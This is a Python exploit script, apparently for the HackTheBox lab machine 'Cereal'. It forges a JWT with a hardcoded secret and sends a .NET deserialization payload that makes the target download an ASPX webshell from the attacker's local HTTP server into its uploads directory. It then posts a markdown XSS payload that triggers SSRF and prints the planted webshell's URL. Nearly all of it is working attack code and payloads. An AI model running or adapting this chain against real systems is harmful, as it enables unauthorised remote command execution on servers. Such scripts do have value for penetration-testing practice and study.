# TODO

# 1. Download https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
# 2. Start python3 -m http.server 1337, wait for it to spin up
# 3. Generate Authorization token from the secret
# 4. Send POST request to /requests with the deserialization payload, get response
# 5. Send POST request to /requests with the XSS payload to trigger SSRF on /requests/[id]

import requests
import os
import urllib.request
import jwt
import datetime
from datetime import timezone
from http.server import HTTPServer, SimpleHTTPRequestHandler
import subprocess
import time
import sys

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


try:
    target = sys.argv[1]
    localip = sys.argv[2]
    filename = sys.argv[3]
except IndexError:
    print("Usage: {} [target] [localip] [filename]")
    print("target: hostname (in this case, cereal.htb)")
    print("localip: local ip address (10.10.X.X)")
    print("filename: what to name cmd.aspx once exploited")

secret = 'secretlhfIH&FY*#oysuflkhskjfhefesf'

print("Starting temporary HTTP server on port 1337...")
server = subprocess.Popen(["python3", "-m", "http.server", "1337"])
time.sleep(5)

print("Retrieving cmd.aspx...")
urllib.request.urlretrieve("https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/asp/cmd.aspx", "cmd.aspx")

print("Generating jwt...")
cereal_jwt = jwt.encode({"name": "0", "exp": datetime.datetime.now(tz=timezone.utc) + datetime.timedelta(days=1)}, secret, algorithm="HS256")
print("JWT generated: {}".format(cereal_jwt))
headers = {"Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer " + cereal_jwt}

print("Sending POST request to /requests with deserialization payload...")
# TODO
payload = "{'$type': 'Cereal.DownloadHelper, Cereal', 'URL': 'http://" + localip + ":1337/cmd.aspx', 'FilePath': 'C:\\\\inetpub\\\\source\\\\uploads\\\\" + filename + ".aspx'}"
response_1 = requests.post("https://" + target + "/requests", json={"json": payload}, headers=headers, proxies=proxies, verify=False)
print("Sending POST request to /requests with XSS/SSRF payload...")
# TODO
print("Response 1: {}".format(response_1))
cereal_id = str(response_1.json()['id'])
print("Cereal id: {}".format(cereal_id))

payload2 = "{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://" + target + "/requests/" + cereal_id + "', true%29;xhr.setRequestHeader%28'Authorization','Bearer " + cereal_jwt + "'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#3a1717\",\"description\":\"d\"}"

response_2 = requests.post("https://" + target + "/requests", json={"json": payload2}, headers=headers, proxies=proxies, verify=False)
print("Response 2: {}".format(response_2))


input("Waiting for hit on HTTP server... Press any key to terminate server")
print("Shutting down HTTP server in 5 seconds...")
time.sleep(5)
server.terminate()
print("You can visit the webshell at this link: http://source.{}/uploads/21098374243-{}.aspx".format(target, filename))
